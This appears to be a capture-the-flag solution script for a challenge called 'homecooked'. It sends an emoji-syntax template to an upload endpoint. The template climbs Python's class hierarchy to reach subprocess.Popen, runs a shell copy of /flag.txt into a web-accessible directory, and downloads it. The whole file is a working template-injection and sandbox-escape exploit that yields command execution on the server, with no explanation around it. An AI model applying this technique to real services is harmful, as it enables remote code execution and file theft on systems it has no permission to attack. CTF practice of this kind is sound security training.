import requests

url = "https://homecooked.challs.pwnoh.io/"

s = requests.Session()

# get subclasses of object, find subprocess.Popen, copy flag to upload dir, download flag
template = """
🍴 a 🍇 "1" 🍴
🍴 b 🍇 a 🥚 __class__ 🍴
🍴 b 🍇 b 🥚 __mro__ 🍴
🍴 b 🍇 b 🍎 1 🍏 🍴

🍴 b 🍇 b 🥚 __subclasses__ 🍴

🍴 b 🍇 b 🦀 🦞 🍴
🍴 popen 🍇 b 🍎 1 🍏 🍴

🍴 🍔 pls 🍟 b 🥄

🍴 🍕 pls 🥚 __name__  🥧 Popen 🥄
  🍴 args 🍇 🍎 cp🌭"/flag.txt"🌭"/tmp/uploads/myflagfile"🍏🍴
  🍴 res 🍇 pls 🦀 args🦞 🍴
  🥢  res 🥢
  🥄🍴
🥄🍴
"""

r = s.post(url + '/chef/upload', json={'text': template})

download_path = r.json()['url']
r = s.get(url + download_path)

r = s.get(url + '/chef/download/myflagfile')
print(r.text)
